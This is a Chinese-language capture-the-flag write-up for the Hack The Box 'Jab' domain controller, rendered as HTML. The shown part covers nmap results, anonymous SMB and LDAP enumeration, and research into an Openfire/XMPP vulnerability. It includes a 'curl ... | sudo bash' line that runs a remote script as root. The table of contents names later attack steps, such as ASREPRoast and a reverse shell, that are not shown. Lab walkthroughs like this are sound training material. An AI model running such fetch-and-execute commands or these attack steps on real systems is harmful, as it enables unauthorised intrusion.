+        <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Initial Access
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag-user" class="md-nav__link">
+    <span class="md-ellipsis">
+      flag: user
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#internal-recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Internal Recon
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#poc-cve-2023-32315-like" class="md-nav__link">
+    <span class="md-ellipsis">
+      PoC (CVE-2023-32315 like)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PoC (CVE-2023-32315 like)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#chisel" class="md-nav__link">
+    <span class="md-ellipsis">
+      chisel配置端口转发
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      插件漏洞获得反弹shell
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      flag: root
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      总结·后记
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Headless/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Headless
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Summary">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#relevant-skills" class="md-nav__link">
+    <span class="md-ellipsis">
+      Relevant Skills
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-path-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Path Overview
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#external-recon-nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      External Recon - nmap
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      攻击路径规划·漏洞分析
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb-" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB - 匿名
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ldap-" class="md-nav__link">
+    <span class="md-ellipsis">
+      LDAP - 匿名
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jabberxmpp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Jabber/XMPP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Jabber/XMPP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jabber" class="md-nav__link">
+    <span class="md-ellipsis">
+      连接Jabber获的用户清单
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#asreproast" class="md-nav__link">
+    <span class="md-ellipsis">
+      ASREPRoast
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jmontgomery" class="md-nav__link">
+    <span class="md-ellipsis">
+      jmontgomery凭据下的探索
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="jmontgomery凭据下的探索">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#winrm" class="md-nav__link">
+    <span class="md-ellipsis">
+      winrm连接失败
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB连接失败
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ldap" class="md-nav__link">
+    <span class="md-ellipsis">
+      LDAP无有用信息
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jabber_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      再次登录Jabber发现新凭据
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#svc_openfire" class="md-nav__link">
+    <span class="md-ellipsis">
+      svc_openfire凭据下的探索
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="svc_openfire凭据下的探索">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound" class="md-nav__link">
+    <span class="md-ellipsis">
+      BloodHound探索
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#executedcom" class="md-nav__link">
+    <span class="md-ellipsis">
+      ExecuteDCOM
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Initial Access
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag-user" class="md-nav__link">
+    <span class="md-ellipsis">
+      flag: user
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#internal-recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Internal Recon
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#poc-cve-2023-32315-like" class="md-nav__link">
+    <span class="md-ellipsis">
+      PoC (CVE-2023-32315 like)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PoC (CVE-2023-32315 like)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#chisel" class="md-nav__link">
+    <span class="md-ellipsis">
+      chisel配置端口转发
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      插件漏洞获得反弹shell
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      flag: root
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      总结·后记
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+  
+<nav class="md-tags" >
+  
+    
+    
+    
+      <span class="md-tag">HTB/Windows</span>
+    
+  
+    
+    
+    
+      <span class="md-tag">HTB/Medium</span>
+    
+  
+</nav>
+
+
+  
+  
+
+
+  <h1>HTB-Jab</h1>
+
+<h2 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">&para;</a></h2>
+<p>...</p>
+<h3 id="relevant-skills">Relevant Skills<a class="headerlink" href="#relevant-skills" title="Permanent link">&para;</a></h3>
+<ul>
+<li>nmap</li>
+<li>Jabber/XMPP</li>
+<li>ASREPRoasting</li>
+<li>hashcat</li>
+<li>CME/NXC</li>
+<li>Port Forwarding（chisel）</li>
+<li>CVE-2023-32315</li>
+</ul>
+<h3 id="attack-path-overview">Attack Path Overview<a class="headerlink" href="#attack-path-overview" title="Permanent link">&para;</a></h3>
+<p><a class="glightbox" href="../../attackpath/HTB-Jab.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="attack-path" src="../../attackpath/HTB-Jab.png" width="450" /></a></p>
+<h2 id="external-recon-nmap">External Recon - nmap<a class="headerlink" href="#external-recon-nmap" title="Permanent link">&para;</a></h2>
+<p>自用扫描脚本：<a href="https://github.com/TimeLess613/workflow-scan4HTB/blob/main/workflow-scan4HTB.sh">工作流</a><br />
+<code>curl -s https://raw.githubusercontent.com/TimeLess613/workflow-scan4HTB/main/workflow-scan4HTB.sh | sudo bash -s &lt;HTB-IP&gt;</code></p>
+<p><strong>开放端口：</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>PORT      STATE SERVICE             VERSION
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>53/tcp    open  domain              Simple DNS Plus
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2024-03-21 04:13:08Z)
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>135/tcp   open  msrpc               Microsoft Windows RPC
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>445/tcp   open  microsoft-ds?
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>464/tcp   open  kpasswd5?
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>636/tcp   open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>5222/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>5223/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>5262/tcp  open  jabber
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>5263/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>5269/tcp  open  xmpp                Wildfire XMPP Client
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>5270/tcp  open  ssl/xmpp            Wildfire XMPP Client
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>5275/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>5276/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>7070/tcp  open  realserver?
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>7443/tcp  open  ssl/oracleas-https?
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>7777/tcp  open  socks5              (No authentication; connection failed)
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>9389/tcp  open  mc-nmf              .NET Message Framing
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>47001/tcp open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>49664/tcp open  msrpc               Microsoft Windows RPC
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>49665/tcp open  msrpc               Microsoft Windows RPC
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>49666/tcp open  msrpc               Microsoft Windows RPC
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>49667/tcp open  msrpc               Microsoft Windows RPC
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>49671/tcp open  msrpc               Microsoft Windows RPC
+</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>49674/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
+</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>49675/tcp open  msrpc               Microsoft Windows RPC
+</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>49676/tcp open  msrpc               Microsoft Windows RPC
+</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>49681/tcp open  msrpc               Microsoft Windows RPC
+</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>49776/tcp open  msrpc               Microsoft Windows RPC
+</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>59676/tcp open  msrpc               Microsoft Windows RPC
+</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>65483/tcp open  msrpc               Microsoft Windows RPC
+</span></code></pre></div></p>
+<p><strong>默认脚本结果：</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>PORT     STATE SERVICE
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>53/tcp   open  domain
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>88/tcp   open  kerberos-sec
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>135/tcp  open  msrpc
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>139/tcp  open  netbios-ssn
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>389/tcp  open  ldap
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>|_ssl-date: 2024-03-21T04:14:58+00:00; -2m51s from scanner time.
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>| ssl-cert: Subject: commonName=DC01.jab.htb
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>| Issuer: commonName=jab-DC01-CA
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>| Public Key type: rsa
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>| Public Key bits: 2048
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>| Signature Algorithm: sha1WithRSAEncryption
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>| Not valid before: 2023-11-01T20:16:18
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>| Not valid after:  2024-10-31T20:16:18
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>445/tcp  open  microsoft-ds
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>464/tcp  open  kpasswd5
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a> (...)
+</span></code></pre></div></p>
+<h2 id="_1">攻击路径规划·漏洞分析<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>一台域控Windows机。开放了常规的DNS、SMB、LDAP、RPC、winrm系列端口，以及一个不常见的jabber，估计也是这个靶机名的由来。与其相关的有5222等端口，查了下MXPP是jabber的别称。另外，有个端口7777是socks5。<br />
+没有HTTP网页，初步判断从SMB、LDAP收集信息，然后调查不寻常的jabber来突破。</p>
+<h2 id="smb-">SMB - 匿名<a class="headerlink" href="#smb-" title="Permanent link">&para;</a></h2>
+<p>匿名连接无法列出共享：
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>└─$<span class="w"> </span>smbclient<span class="w"> </span>//10.10.11.4/<span class="w"> </span>-N
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>└─$<span class="w"> </span>
+</span></code></pre></div></p>
+<p>最初的默认脚本扫描结果中也确实没有SMB的任何信息。</p>
+<h2 id="ldap-">LDAP - 匿名<a class="headerlink" href="#ldap-" title="Permanent link">&para;</a></h2>
+<p>LDAP的匿名连接也没获得什么有用信息，域名、目标主机名之前的扫描结果也能得知就是<code>DC01.jab.htb</code>：
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>┌──<span class="o">(</span>kali㉿kalik<span class="o">)</span>-<span class="o">[</span>~/Lab/HTB/Jab/infoG<span class="o">]</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>└─$<span class="w"> </span>ldapsearch<span class="w"> </span>-LLL<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://10.10.11.4<span class="w"> </span>-s<span class="w"> </span>base<span class="w">                                  </span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>dn:
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>domainFunctionality:<span class="w"> </span><span class="m">7</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>forestFunctionality:<span class="w"> </span><span class="m">7</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>domainControllerFunctionality:<span class="w"> </span><span class="m">7</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>rootDomainNamingContext:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>ldapServiceName:<span class="w"> </span>jab.htb:dc01<span class="nv">$@</span>JAB.HTB
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>isGlobalCatalogReady:<span class="w"> </span>TRUE
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>supportedSASLMechanisms:<span class="w"> </span>GSSAPI
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>supportedSASLMechanisms:<span class="w"> </span>GSS-SPNEGO
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>supportedSASLMechanisms:<span class="w"> </span>EXTERNAL
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>supportedSASLMechanisms:<span class="w"> </span>DIGEST-MD5
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="w"> </span><span class="o">(</span>...<span class="o">)</span>
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>subschemaSubentry:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Aggregate,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>serverName:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>DC01,CN<span class="o">=</span>Servers,CN<span class="o">=</span>Default-First-Site-Name,CN<span class="o">=</span>Sites,CN<span class="o">=</span>Configur
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="w"> </span>ation,DC<span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>schemaNamingContext:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>namingContexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>namingContexts:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>namingContexts:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>namingContexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>namingContexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>isSynchronized:<span class="w"> </span>TRUE
+</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>highestCommittedUSN:<span class="w"> </span><span class="m">262616</span>
+</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>dsServiceName:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>NTDS<span class="w"> </span>Settings,CN<span class="o">=</span>DC01,CN<span class="o">=</span>Servers,CN<span class="o">=</span>Default-First-Site-Name,
+</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a><span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Sites,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>dnsHostName:<span class="w"> </span>DC01.jab.htb
+</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a>defaultNamingContext:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a>currentTime:<span class="w"> </span><span class="m">20240323052215</span>.0Z
+</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a>configurationNamingContext:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>jab,DC<span class="o">=</span>htb
+</span></code></pre></div></p>
+<h2 id="jabberxmpp">Jabber/XMPP<a class="headerlink" href="#jabberxmpp" title="Permanent link">&para;</a></h2>
+<p>搜索一下<code>Ignite Realtime Openfire Jabber</code>，得知Jabber是XMPP的旧名，它是一种以XML为基础的开放式即时通信协。Openfire是Ignite Realtime这个开源社区下的应用程序名。<br />
+搜了下<code>Openfire exploit</code>，发现最近有个<code>CVE-2023-32315</code>，以为这就是突破口了。不过看了下这个漏洞是针对9090端口的Openfire Console，用来绕过登录认证以及使用REC插件。</p>
+<blockquote>
+<p><a href="https://github.com/miko550/CVE-2023-32315">Openfire Console Authentication Bypass Vulnerability with RCE plugin</a></p>
+</blockquote>
+<p>不死心，想着这台机器是不是将默认的9090端口改了，于是访问了jabber相关的所有端口，没有发现Console网页。</p>
+<h3 id="jabber">连接Jabber获的用户清单<a class="headerlink" href="#jabber" title="Permanent link">&para;</a></h3>
+<p>没辙了，感觉要研究一下这个Jabber的使用。又看了眼<a href="https://zh.wikipedia.org/zh-cn/XMPP">wiki</a>说似乎是个聊天软件，以及XMPP是分布式的即时通信系统，然后有客户端服务端什么的。那么下载个客户端，连接目标主机这个服务端应该能发现些什么信息？<br />
+问了下ChatGPT推荐了个客户端，我选择了使用pidgin。</p>
